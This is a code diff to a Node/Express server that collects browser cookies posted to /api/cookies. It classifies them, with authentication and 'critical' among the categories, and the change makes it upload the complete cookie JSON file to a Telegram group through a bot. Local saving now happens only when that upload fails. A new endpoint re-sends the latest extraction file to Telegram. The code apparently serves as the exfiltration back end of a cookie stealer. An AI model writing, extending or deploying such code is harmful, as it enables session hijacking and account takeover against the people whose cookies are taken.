@@ -60,6 +60,17 @@ class TelegramNotifier {
 
 const telegramNotifier = new TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_GROUP_CHAT_ID);
 
+// Helper function for sending files to Telegram
+async function sendCookieFileToTelegram(telegramNotifier, filePath, caption) {
+    try {
+        await telegramNotifier.sendDocument(filePath, caption);
+        return true;
+    } catch (error) {
+        console.log(`Failed to send file to Telegram: ${error.message}`);
+        return false;
+    }
+}
+
 async function getNextExtractionNumber(baseDir) {
     try {
         const items = await fs.readdir(baseDir);
@@ -174,76 +185,118 @@ app.post('/api/cookies', async (req, res) => {
         
         console.log(`Processing ${cookies.length} cookies...`);
         
-        // Step 1: Send Telegram notification (simple message only)
-        let telegramSuccess = false;
+        // Step 1: Try to send JSON file directly to Telegram first
+        let telegramFileSent = false;
+        let shouldSaveLocally = true;
+        
         try {
-            const notificationText = `Cookie Extraction Alert\n\nTime: ${new Date().toLocaleString()}\nTotal Cookies: ${cookies.length}\n\nSomeone extracted cookies successfully!`;
-            await telegramNotifier.sendMessage(notificationText);
-            telegramSuccess = true;
-            console.log('Telegram notification sent successfully');
+            // Send basic notification
+            const basicNotification = `🍪 Cookie Extraction Alert\n\nTime: ${new Date().toLocaleString()}\nTotal Cookies: ${cookies.length}\nFilename: ${filename}\n\nExtraction completed successfully!`;
+            await telegramNotifier.sendMessage(basicNotification);
+            
+            // Create temporary file to send to Telegram
+            const tempFilePath = path.join(__dirname, 'temp_cookies.json');
+            await fs.writeFile(tempFilePath, JSON.stringify(cookieData, null, 2));
+            
+            // Try to send file to Telegram
+            const fileCaption = `📁 Complete Cookie Data File\n\nFilename: ${filename}\nTotal Cookies: ${cookies.length}\nExtracted: ${new Date().toLocaleString()}`;
+            telegramFileSent = await sendCookieFileToTelegram(telegramNotifier, tempFilePath, fileCaption);
+            
+            // Clean up temp file
+            try {
+                await fs.unlink(tempFilePath);
+            } catch (cleanupError) {
+                console.log(`Warning: Could not cleanup temp file: ${cleanupError.message}`);
+            }
+            
+            if (telegramFileSent) {
+                console.log('Cookie JSON file sent to Telegram successfully - skipping local save');
+                shouldSaveLocally = false;
+            } else {
+                console.log('Failed to send file to Telegram - will save locally');
+            }
+            
         } catch (telegramError) {
-            console.log(`Telegram notification failed: ${telegramError.message}`);
+            console.log(`Telegram operation failed: ${telegramError.message}`);
             if (telegramError.response) {
                 console.log(`Telegram API Error: ${JSON.stringify(telegramError.response.data)}`);
             }
         }
         
-        // Step 2: Always save to local downloads folder with classification
-        const classifier = new CookieClassifier();
-        const nextExtractionNumber = await getNextExtractionNumber(DOWNLOADS_DIR);
-        const folderName = `extraction_${nextExtractionNumber}`;
-        const folderPath = path.join(DOWNLOADS_DIR, folderName);
-        await fs.mkdir(folderPath, { recursive: true });
+        // Step 2: Only save locally if Telegram file sending failed
+        let folderName = null;
+        let categorizedCounts = {};
         
-        // Classify and organize cookies
-        const categorizedCookies = {
-            critical: [],
-            authentication: [],
-            tracking: [],
-            advertising: [],
-            functional: [],
-            unknown: []
-        };
-        
-        cookies.forEach(cookie => {
-            const category = classifier.classifyCookie(cookie);
-            categorizedCookies[category].push(cookie);
-        });
-        
-        // Save main cookies file
-        await fs.writeFile(
-            path.join(folderPath, 'cookies.json'),
-            JSON.stringify(cookieData, null, 2)
-        );
-        
-        // Save categorized files
-        for (const [category, categoryCookies] of Object.entries(categorizedCookies)) {
-            if (categoryCookies.length > 0) {
-                await fs.writeFile(
-                    path.join(folderPath, `${category}.json`),
-                    JSON.stringify({
-                        category: category,
-                        count: categoryCookies.length,
-                        cookies: categoryCookies,
-                        extractedAt: new Date().toISOString()
-                    }, null, 2)
-                );
+        if (shouldSaveLocally) {
+            console.log('Saving to local downloads folder...');
+            await ensureDownloadsDir();
+            
+            const classifier = new CookieClassifier();
+            const nextExtractionNumber = await getNextExtractionNumber(DOWNLOADS_DIR);
+            folderName = `extraction_${nextExtractionNumber}`;
+            const folderPath = path.join(DOWNLOADS_DIR, folderName);
+            await fs.mkdir(folderPath, { recursive: true });
+            
+            // Classify and organize cookies
+            const categorizedCookies = {
+                critical: [],
+                authentication: [],
+                tracking: [],
+                advertising: [],
+                functional: [],
+                unknown: []
+            };
+            
+            cookies.forEach(cookie => {
+                const category = classifier.classifyCookie(cookie);
+                categorizedCookies[category].push(cookie);
+            });
+            
+            // Save main cookies file
+            await fs.writeFile(
+                path.join(folderPath, 'cookies.json'),
+                JSON.stringify(cookieData, null, 2)
+            );
+            
+            // Save categorized files
+            for (const [category, categoryCookies] of Object.entries(categorizedCookies)) {
+                if (categoryCookies.length > 0) {
+                    await fs.writeFile(
+                        path.join(folderPath, `${category}.json`),
+                        JSON.stringify({
+                            category: category,
+                            count: categoryCookies.length,
+                            cookies: categoryCookies,
+                            extractedAt: new Date().toISOString()
+                        }, null, 2)
+                    );
+                }
             }
+            
+            categorizedCounts = Object.fromEntries(
+                Object.entries(categorizedCookies).map(([cat, cookies]) => [cat, cookies.length])
+            );
         }
         
-        const message = `Cookies saved to ${folderName}${telegramSuccess ? ' (Telegram notified)' : ' (Telegram failed)'}`;
-        console.log(`Saved to local folder: ${folderName}`);
+        let statusMessage;
+        if (telegramFileSent) {
+            statusMessage = 'Cookies sent to Telegram successfully (no local save needed)';
+        } else if (folderName) {
+            statusMessage = `Telegram failed - cookies saved locally to ${folderName}`;
+            console.log(`Saved to local folder: ${folderName}`);
+        } else {
+            statusMessage = 'Both Telegram and local save failed';
+        }
 
         return res.json({
             success: true,
-            message: message,
+            message: statusMessage,
             data: {
-                telegramSuccess: telegramSuccess,
+                telegramFileSent: telegramFileSent,
+                savedLocally: shouldSaveLocally,
                 folderName: folderName,
                 totalCookies: cookies.length,
-                categorizedCounts: Object.fromEntries(
-                    Object.entries(categorizedCookies).map(([cat, cookies]) => [cat, cookies.length])
-                ),
+                categorizedCounts: categorizedCounts,
                 savedAt: cookieData.metadata.savedAt
             }
         });
@@ -272,6 +325,56 @@ app.post('/api/test-telegram', async (req, res) => {
         res.status(500).json({
             success: false,
             error: `Failed to send test notification: ${error.message}`
+        });
+    }
+});
+
+app.post('/api/test-telegram-file', async (req, res) => {
+    try {
+        // Find the most recent extraction folder
+        const items = await fs.readdir(DOWNLOADS_DIR);
+        const extractionFolders = items.filter(item => item.startsWith('extraction_'));
+        
+        if (extractionFolders.length === 0) {
+            return res.status(404).json({
+                success: false,
+                error: 'No extraction folders found to test with'
+            });
+        }
+        
+        const latestFolder = extractionFolders.sort().pop();
+        const testFilePath = path.join(DOWNLOADS_DIR, latestFolder, 'cookies.json');
+        
+        // Check if file exists
+        try {
+            await fs.access(testFilePath);
+        } catch {
+            return res.status(404).json({
+                success: false,
+                error: `Test file not found: ${testFilePath}`
+            });
+        }
+        
+        const testCaption = `🧪 Test File Send\n\nTesting file upload functionality\nTime: ${new Date().toLocaleString()}`;
+        
+        const success = await sendCookieFileToTelegram(telegramNotifier, testFilePath, testCaption);
+        
+        if (success) {
+            res.json({
+                success: true,
+                message: `Test file sent successfully to Telegram from ${latestFolder}`
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                error: 'Failed to send test file to Telegram'
+            });
+        }
+        
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            error: `Failed to send test file: ${error.message}`
         });
     }
 });
